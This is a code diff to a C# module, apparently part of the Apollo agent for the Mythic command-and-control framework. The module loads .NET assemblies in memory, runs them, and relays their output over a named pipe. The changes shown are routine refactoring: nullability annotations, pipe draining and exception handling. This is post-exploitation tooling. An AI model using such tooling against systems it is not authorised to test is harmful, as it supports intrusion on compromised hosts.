@@ -34,16 +34,16 @@ namespace ExecuteAssembly
         static extern IntPtr LocalFree(IntPtr hMem);
 
         private static JsonSerializer _jsonSerializer = new JsonSerializer();
-        private static string _namedPipeName;
+        private static string? _namedPipeName;
         private static ConcurrentQueue<byte[]> _senderQueue = new ConcurrentQueue<byte[]>();
         private static ConcurrentQueue<IMythicMessage> _recieverQueue = new ConcurrentQueue<IMythicMessage>();
-        private static AsyncNamedPipeServer _server;
+        private static AsyncNamedPipeServer? _server;
         private static AutoResetEvent _senderEvent = new AutoResetEvent(false);
         private static AutoResetEvent _receiverEvent = new AutoResetEvent(false);
         private static ConcurrentDictionary<string, ChunkedMessageStore<IPCChunkedData>> MessageStore = new ConcurrentDictionary<string, ChunkedMessageStore<IPCChunkedData>>();
         private static CancellationTokenSource _cts = new CancellationTokenSource();
-        private static Action<object> _sendAction;
-        private static ST.Task _clientConnectedTask = null;
+        private static Action<object>? _sendAction;
+        private static ST.Task? _clientConnectedTask;
 
         public static void Main(string[] args)
         {
@@ -69,10 +69,18 @@ namespace ExecuteAssembly
                         pipe.BeginWrite(result, 0, result.Length, OnAsyncMessageSent, pipe);
                     }
                 }
-                //pipe.Flush();
+
+                while (_senderQueue.TryDequeue(out byte[] message))
+                {
+                    pipe.BeginWrite(message, 0, message.Length, OnAsyncMessageSent, pipe);
+                }
+
+                // Wait for all messages to be read by Apollo
+                pipe.WaitForPipeDrain();
                 pipe.Close();
             };
-            _server = new AsyncNamedPipeServer(_namedPipeName, null, 1, IPC.SEND_SIZE, IPC.RECV_SIZE);
+
+            _server = new AsyncNamedPipeServer(_namedPipeName, instances: 1, BUF_OUT: IPC.SEND_SIZE, BUF_IN: IPC.RECV_SIZE);
             _server.ConnectionEstablished += OnAsyncConnect;
             _server.MessageReceived += OnAsyncMessageReceived;
             _receiverEvent.WaitOne();
@@ -106,14 +114,17 @@ namespace ExecuteAssembly
                     }
 
                     asm.EntryPoint.Invoke(null, new object[] { ParseCommandLine(command.StringData) });
-                    while(_senderQueue.Count > 0)
-                    {
-                        Thread.Sleep(1000);
-                    }
-                } catch (Exception ex)
+                }
+                catch (TargetInvocationException ex)
                 {
-                    Console.WriteLine($"Unhandled exception from assembly: {ex.Message}");
-                } finally
+                    Exception inner = ex.InnerException;
+                    Console.WriteLine($"\nUnhandled Exception: {inner}");
+                }
+                catch (Exception ex)
+                {
+                    Console.WriteLine($"Unhandled exception from assembly loader: {ex.Message}");
+                }
+                finally
                 {
                     Console.SetOut(originalStdout);
                     Console.SetError(originalStderr);
@@ -121,6 +132,12 @@ namespace ExecuteAssembly
             }
 
             _cts.Cancel();
+
+            // Wait for the pipe client comms to finish
+            if (_clientConnectedTask is ST.Task task)
+            {
+                task.Wait(1000);
+            }
         }
 
         private static string[] ParseCommandLine(string cmdline)
@@ -168,11 +185,7 @@ namespace ExecuteAssembly
         {
             PipeStream pipe = (PipeStream)result.AsyncState;
             pipe.EndWrite(result);
-            // Potentially delete this since theoretically the sender Task does everything
-            if (_senderQueue.TryDequeue(out byte[] data))
-            {
-                pipe.BeginWrite(data, 0, data.Length, OnAsyncMessageSent, pipe);
-            }
+            pipe.Flush();
         }
 
         private static void OnAsyncMessageReceived(object sender, NamedPipeMessageArgs args)
